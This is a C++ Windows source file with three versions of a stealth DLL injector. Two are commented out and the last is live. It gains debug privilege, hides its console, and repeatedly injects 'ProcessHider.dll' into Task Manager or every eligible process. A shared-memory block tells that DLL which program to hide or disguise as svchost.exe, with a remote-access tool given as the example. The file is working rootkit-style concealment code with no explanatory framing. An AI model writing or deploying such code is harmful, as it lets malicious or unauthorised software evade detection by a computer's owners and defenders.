// #include <Windows.h>
// #include <iostream>
// #include <fstream>
// #include <string>
// #include <TlHelp32.h>

// #pragma comment(lib, "Advapi32.lib")
// #pragma comment(lib, "user32.lib")

// using namespace std;

// HANDLE g_hMap = NULL;
// LPVOID g_pBuf = NULL;
// string g_targetProcess;
// string g_logPath;

// void Log(const string& msg) {
//     ofstream log(g_logPath, ios::app);
//     if (log.is_open()) {
//         SYSTEMTIME st;
//         GetLocalTime(&st);
//         char timeBuf[32];
//         sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
//         log << timeBuf << msg << endl;
//         log.close();
//     }
// }

// bool enable_debug_privilege() {
//     HANDLE hToken;
//     TOKEN_PRIVILEGES tkp;
//     LUID luid;

//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
//         return false;
//     if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
//         CloseHandle(hToken);
//         return false;
//     }

//     tkp.PrivilegeCount = 1;
//     tkp.Privileges[0].Luid = luid;
//     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

//     if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
//         CloseHandle(hToken);
//         return false;
//     }

//     BOOL ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
//     CloseHandle(hToken);
//     return ok;
// }

// bool inject_dll(DWORD pid, string dll_path) {
//     DWORD dwAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
//                      PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

//     HANDLE hProcess = OpenProcess(dwAccess, FALSE, pid);
//     if (!hProcess) return false;

//     SIZE_T pathSize = dll_path.length() + 1;
//     LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//     if (!remoteBuffer) {
//         CloseHandle(hProcess);
//         return false;
//     }

//     if (!WriteProcessMemory(hProcess, remoteBuffer, dll_path.c_str(), pathSize, NULL)) {
//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//         CloseHandle(hProcess);
//         return false;
//     }

//     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
//     LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
//     if (!pLoadLibraryA) {
//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//         CloseHandle(hProcess);
//         return false;
//     }

//     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryA, remoteBuffer, 0, NULL);
//     if (!hThread) {
//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//         CloseHandle(hProcess);
//         return false;
//     }

//     WaitForSingleObject(hThread, 10000);
//     DWORD exitCode = 0;
//     GetExitCodeThread(hThread, &exitCode);

//     CloseHandle(hThread);
//     VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//     CloseHandle(hProcess);

//     return (exitCode != 0);
// }

// DWORD WINAPI find_and_inject(LPVOID lpParam) {
//     Log("[THREAD] Started");

//     if (!enable_debug_privilege()) {
//         Log("[ERROR] Admin privileges required.");
//         return 1;
//     }

//     char dll_path_c[3000];
//     GetModuleFileNameA(NULL, dll_path_c, 3000);
//     string dll_path(dll_path_c);
//     size_t index = dll_path.find_last_of('\\');
//     if (index != string::npos) dll_path.erase(index);
//     dll_path.append("\\ProcessHider.dll");

//     DWORD lastpid = 4;

//     while (true) {
//         PROCESSENTRY32 process{};
//         process.dwSize = sizeof(PROCESSENTRY32);

//         HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//         if (proc_snap == INVALID_HANDLE_VALUE) {
//             Sleep(1000);
//             continue;
//         }

//         if (!Process32First(proc_snap, &process)) {
//             CloseHandle(proc_snap);
//             Sleep(1000);
//             continue;
//         }

//         bool taskManagerFound = false;

//         do {
//             if (_stricmp(process.szExeFile, "Taskmgr.exe") == 0) {
//                 taskManagerFound = true;
//                 if (lastpid != process.th32ProcessID) {
//                     Log("[DETECT] Task Manager PID: " + to_string(process.th32ProcessID));
//                     if (inject_dll(process.th32ProcessID, dll_path)) {
//                         Log("[+] Injected into Task Manager");
//                         lastpid = process.th32ProcessID;
//                     } else {
//                         Log("[-] Injection failed");
//                     }
//                 }
//             }
//         } while (Process32Next(proc_snap, &process));

//         if (!taskManagerFound) {
//             Log("[SCAN] Task Manager not running");
//         }

//         CloseHandle(proc_snap);
//         Sleep(1000);
//     }
//     return 0;
// }

// bool map_process_name(string process) {
//     g_hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 255, "GetProcessName");
//     if (!g_hMap) return false;

//     g_pBuf = MapViewOfFile(g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!g_pBuf) {
//         CloseHandle(g_hMap);
//         g_hMap = NULL;
//         return false;
//     }
//     CopyMemory(g_pBuf, process.c_str(), process.length() + 1);
//     return true;
// }

// int main() {
//     // Setup log file path (same folder as EXE)
//     char exePath[3000];
//     GetModuleFileNameA(NULL, exePath, 3000);
//     string path(exePath);
//     size_t idx = path.find_last_of('\\');
//     if (idx != string::npos) path.erase(idx + 1);
//     g_logPath = path + "log.txt";
//     ofstream(g_logPath, ios::trunc).close();

//     string processName;
//     cout << " Enter Process Name To Hide" << endl << "--> ";
//     cin >> processName;
//     cout << endl;

//     g_targetProcess = processName;
//     Log("[MAIN] Target: " + processName);

//     if (!map_process_name(processName)) {
//         Log("[MAIN] map_process_name() FAILED");
//         return 1;
//     }

//     Log("[MAIN] map_process_name() SUCCESS");

//     // Hide the console window so the app runs silently in background
//     HWND hConsole = GetConsoleWindow();
//     if (hConsole) {
//         ShowWindow(hConsole, SW_HIDE);
//     }

//     HANDLE hThread = CreateThread(NULL, 0, find_and_inject, NULL, 0, NULL);
//     if (!hThread) return 1;
//     CloseHandle(hThread);

//     // Keep process alive silently
//     while (true) Sleep(10000);
//     return 0;
// }













// #include <Windows.h>
// #include <iostream>
// #include <fstream>
// #include <string>
// #include <TlHelp32.h>
// #include <set>

// #pragma comment(lib, "Advapi32.lib")

// using namespace std;

// HANDLE g_hMap = NULL;
// LPVOID g_pBuf = NULL;
// string g_targetProcess;
// string g_logPath;
// DWORD g_myPid = 0;
// set<DWORD> g_injectedPids;

// void Log(const string& msg) {
//     ofstream log(g_logPath, ios::app);
//     if (log.is_open()) {
//         SYSTEMTIME st;
//         GetLocalTime(&st);
//         char timeBuf[32];
//         sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
//         log << timeBuf << msg << endl;
//         log.close();
//     }
// }

// bool enable_debug_privilege() {
//     HANDLE hToken;
//     TOKEN_PRIVILEGES tkp;
//     LUID luid;

//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
//         return false;
//     if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
//         CloseHandle(hToken);
//         return false;
//     }

//     tkp.PrivilegeCount = 1;
//     tkp.Privileges[0].Luid = luid;
//     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

//     if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
//         CloseHandle(hToken);
//         return false;
//     }

//     BOOL ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
//     CloseHandle(hToken);
//     return ok;
// }

// bool is_system_process(DWORD pid) {
//     if (pid == 0 || pid == 4) return true;

//     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
//     if (!hProcess) return false;

//     BOOL isCritical = FALSE;
//     typedef BOOL (WINAPI *pIsCritical)(HANDLE, PBOOL);
//     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
//     pIsCritical IsCriticalProcess = (pIsCritical)GetProcAddress(hKernel32, "IsCriticalProcess");
//     if (IsCriticalProcess) {
//         IsCriticalProcess(hProcess, &isCritical);
//     }
//     CloseHandle(hProcess);
//     return isCritical == TRUE;
// }

// bool inject_dll(DWORD pid, const string& dll_path) {
//     if (pid == g_myPid) return false;
//     if (is_system_process(pid)) return false;

//     DWORD dwAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
//                      PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

//     HANDLE hProcess = OpenProcess(dwAccess, FALSE, pid);
//     if (!hProcess) return false;

// #ifdef _WIN64
//     // If this is a 64-bit build, skip 32-bit (WOW64) processes — they can't load a 64-bit DLL
//     BOOL isWow64 = FALSE;
//     typedef BOOL (WINAPI *pIsWow64)(HANDLE, PBOOL);
//     pIsWow64 fnIsWow64 = (pIsWow64)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
//     if (fnIsWow64 && fnIsWow64(hProcess, &isWow64) && isWow64) {
//         CloseHandle(hProcess);
//         return false;
//     }
// #endif

//     SIZE_T pathSize = dll_path.length() + 1;
//     LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//     if (!remoteBuffer) {
//         CloseHandle(hProcess);
//         return false;
//     }

//     if (!WriteProcessMemory(hProcess, remoteBuffer, dll_path.c_str(), pathSize, NULL)) {
//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//         CloseHandle(hProcess);
//         return false;
//     }

//     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
//     LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
//     if (!pLoadLibraryA) {
//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//         CloseHandle(hProcess);
//         return false;
//     }

//     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryA, remoteBuffer, 0, NULL);
//     if (!hThread) {
//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//         CloseHandle(hProcess);
//         return false;
//     }

//     WaitForSingleObject(hThread, 5000);
//     DWORD exitCode = 0;
//     GetExitCodeThread(hThread, &exitCode);

//     CloseHandle(hThread);
//     VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
//     CloseHandle(hProcess);

//     return (exitCode != 0);
// }

// DWORD WINAPI find_and_inject(LPVOID lpParam) {
//     Log("[THREAD] Started — injecting into ALL eligible processes");

//     if (!enable_debug_privilege()) {
//         Log("[ERROR] Admin privileges required.");
//         return 1;
//     }

//     char dll_path_c[3000];
//     GetModuleFileNameA(NULL, dll_path_c, 3000);
//     string dll_path(dll_path_c);
//     size_t index = dll_path.find_last_of('\\');
//     if (index != string::npos) dll_path.erase(index);
//     dll_path.append("\\ProcessHider.dll");

//     while (true) {
//         PROCESSENTRY32 process{};
//         process.dwSize = sizeof(PROCESSENTRY32);

//         HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//         if (proc_snap == INVALID_HANDLE_VALUE) {
//             Sleep(2000);
//             continue;
//         }

//         if (!Process32First(proc_snap, &process)) {
//             CloseHandle(proc_snap);
//             Sleep(2000);
//             continue;
//         }

//         do {
//             DWORD pid = process.th32ProcessID;

//             // Already injected this PID?
//             if (g_injectedPids.find(pid) != g_injectedPids.end())
//                 continue;

//             // Skip self and low/system PIDs
//             if (pid == g_myPid || pid <= 4)
//                 continue;

//             if (inject_dll(pid, dll_path)) {
//                 Log("[+] Injected into PID: " + to_string(pid) + " (" + string(process.szExeFile) + ")");
//                 g_injectedPids.insert(pid);
//             }
//             // Silently skip failures (access denied, protected process, etc.) to avoid log spam

//         } while (Process32Next(proc_snap, &process));

//         CloseHandle(proc_snap);

//         // Every ~30 seconds, purge dead PIDs so recycled ones can be re-injected
//         static int cleanupCounter = 0;
//         if (++cleanupCounter >= 30) {
//             cleanupCounter = 0;
//             for (auto it = g_injectedPids.begin(); it != g_injectedPids.end(); ) {
//                 HANDLE hTest = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, *it);
//                 if (!hTest) {
//                     it = g_injectedPids.erase(it);
//                 } else {
//                     CloseHandle(hTest);
//                     ++it;
//                 }
//             }
//         }

//         Sleep(1000);
//     }
//     return 0;
// }

// bool map_process_name(const string& process) {
//     g_hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 255, "GetProcessName");
//     if (!g_hMap) return false;

//     g_pBuf = MapViewOfFile(g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!g_pBuf) {
//         CloseHandle(g_hMap);
//         g_hMap = NULL;
//         return false;
//     }
//     CopyMemory(g_pBuf, process.c_str(), process.length() + 1);
//     return true;
// }

// int main() {
//     g_myPid = GetCurrentProcessId();

//     char exePath[3000];
//     GetModuleFileNameA(NULL, exePath, 3000);
//     string path(exePath);
//     size_t idx = path.find_last_of('\\');
//     if (idx != string::npos) path.erase(idx + 1);
//     g_logPath = path + "log.txt";
//     ofstream(g_logPath, ios::trunc).close();

//     string processName;
//     cout << " Enter Process Name To Masquerade" << endl << "--> ";
//     cin >> processName;
//     cout << endl;

//     g_targetProcess = processName;
//     Log("[MAIN] Target: " + processName + " -> svchost.exe");

//     if (!map_process_name(processName)) {
//         Log("[MAIN] map_process_name() FAILED");
//         return 1;
//     }

//     Log("[MAIN] map_process_name() SUCCESS");

//     HWND hConsole = GetConsoleWindow();
//     if (hConsole) ShowWindow(hConsole, SW_HIDE);

//     HANDLE hThread = CreateThread(NULL, 0, find_and_inject, NULL, 0, NULL);
//     if (!hThread) return 1;
//     CloseHandle(hThread);

//     while (true) Sleep(10000);
//     return 0;
// }






































#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <TlHelp32.h>
#include <set>

#pragma comment(lib, "Advapi32.lib")

using namespace std;

HANDLE g_hMap = NULL;
LPVOID g_pBuf = NULL;
string g_targetProcess;
string g_logPath;
DWORD g_myPid = 0;
set<DWORD> g_injectedPids;

void Log(const string& msg) {
    ofstream log(g_logPath, ios::app);
    if (log.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timeBuf[32];
        sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
        log << timeBuf << msg << endl;
        log.close();
    }
}

bool enable_debug_privilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }

    BOOL ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    CloseHandle(hToken);
    return ok;
}

bool is_system_process(DWORD pid) {
    if (pid == 0 || pid == 4) return true;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return false;

    BOOL isCritical = FALSE;
    typedef BOOL (WINAPI *pIsCritical)(HANDLE, PBOOL);
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pIsCritical IsCriticalProcess = (pIsCritical)GetProcAddress(hKernel32, "IsCriticalProcess");
    if (IsCriticalProcess) {
        IsCriticalProcess(hProcess, &isCritical);
    }
    CloseHandle(hProcess);
    return isCritical == TRUE;
}

bool inject_dll(DWORD pid, const string& dll_path) {
    if (pid == g_myPid) return false;
    if (is_system_process(pid)) return false;

    DWORD dwAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    HANDLE hProcess = OpenProcess(dwAccess, FALSE, pid);
    if (!hProcess) return false;

#ifdef _WIN64
    BOOL isWow64 = FALSE;
    typedef BOOL (WINAPI *pIsWow64)(HANDLE, PBOOL);
    pIsWow64 fnIsWow64 = (pIsWow64)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
    if (fnIsWow64 && fnIsWow64(hProcess, &isWow64) && isWow64) {
        CloseHandle(hProcess);
        return false;
    }
#endif

    SIZE_T pathSize = dll_path.length() + 1;
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, dll_path.c_str(), pathSize, NULL)) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryA, remoteBuffer, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, 5000);
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return (exitCode != 0);
}

DWORD FindTargetPid(const string& name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD found = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name.c_str()) == 0) {
                found = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

DWORD WINAPI find_and_inject(LPVOID lpParam) {
    Log("[THREAD] Injection thread started");

    if (!enable_debug_privilege()) {
        Log("[ERROR] Admin privileges required.");
        return 1;
    }

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    string dllPath(exePath);
    size_t lastSlash = dllPath.find_last_of('\\');
    if (lastSlash != string::npos) dllPath.erase(lastSlash + 1);
    dllPath.append("ProcessHider.dll");

    Log("[MAIN] DLL path: " + dllPath);

    while (true) {
        PROCESSENTRY32 pe32{};
        pe32.dwSize = sizeof(PROCESSENTRY32);

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) {
            Sleep(2000);
            continue;
        }

        if (!Process32First(hSnap, &pe32)) {
            CloseHandle(hSnap);
            Sleep(2000);
            continue;
        }

        do {
            DWORD pid = pe32.th32ProcessID;

            if (g_injectedPids.count(pid)) continue;
            if (pid == g_myPid || pid <= 4) continue;

            if (inject_dll(pid, dllPath)) {
                Log("[+] Injected PID " + to_string(pid) + " (" + string(pe32.szExeFile) + ")");
                g_injectedPids.insert(pid);
            }

        } while (Process32Next(hSnap, &pe32));

        CloseHandle(hSnap);

        DWORD targetPid = FindTargetPid(g_targetProcess);
        if (targetPid != 0 && g_pBuf) {
            memcpy((char*)g_pBuf + 132, &targetPid, sizeof(DWORD));
        }

        static int cleanup = 0;
        if (++cleanup >= 30) {
            cleanup = 0;
            for (auto it = g_injectedPids.begin(); it != g_injectedPids.end(); ) {
                HANDLE hTest = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, *it);
                if (!hTest) {
                    it = g_injectedPids.erase(it);
                } else {
                    CloseHandle(hTest);
                    ++it;
                }
            }
        }

        Sleep(1000);
    }
    return 0;
}

bool setup_shared_memory(const string& targetName) {
    g_hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 256, "GetProcessName");
    if (!g_hMap) return false;

    g_pBuf = MapViewOfFile(g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, 256);
    if (!g_pBuf) {
        CloseHandle(g_hMap);
        g_hMap = NULL;
        return false;
    }

    memset(g_pBuf, 0, 256);
    CopyMemory(g_pBuf, targetName.c_str(), min(targetName.length(), (size_t)127));

    DWORD* pidPtr = (DWORD*)((char*)g_pBuf + 128);
    *pidPtr = g_myPid;

    DWORD targetPid = FindTargetPid(targetName);
    DWORD* targetPidPtr = (DWORD*)((char*)g_pBuf + 132);
    *targetPidPtr = targetPid;

    return true;
}

int main() {
    g_myPid = GetCurrentProcessId();

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    string basePath(exePath);
    size_t idx = basePath.find_last_of('\\');
    if (idx != string::npos) basePath.erase(idx + 1);
    g_logPath = basePath + "log.txt";
    ofstream(g_logPath, ios::trunc).close();

    string targetName;
    cout << " Enter Process Name To Masquerade (e.g., getscreen.exe)" << endl << "--> ";
    cin >> targetName;
    cout << endl;

    g_targetProcess = targetName;
    Log("[MAIN] Target: " + targetName + " -> svchost.exe | PID: " + to_string(g_myPid));

    if (!setup_shared_memory(targetName)) {
        Log("[MAIN] setup_shared_memory() FAILED");
        return 1;
    }

    Log("[MAIN] Shared memory created");

    HWND hConsole = GetConsoleWindow();
    if (hConsole) ShowWindow(hConsole, SW_HIDE);

    HANDLE hThread = CreateThread(NULL, 0, find_and_inject, NULL, 0, NULL);
    if (!hThread) {
        Log("[MAIN] Failed to create thread");
        return 1;
    }
    CloseHandle(hThread);

    while (true) Sleep(10000);
    return 0;
}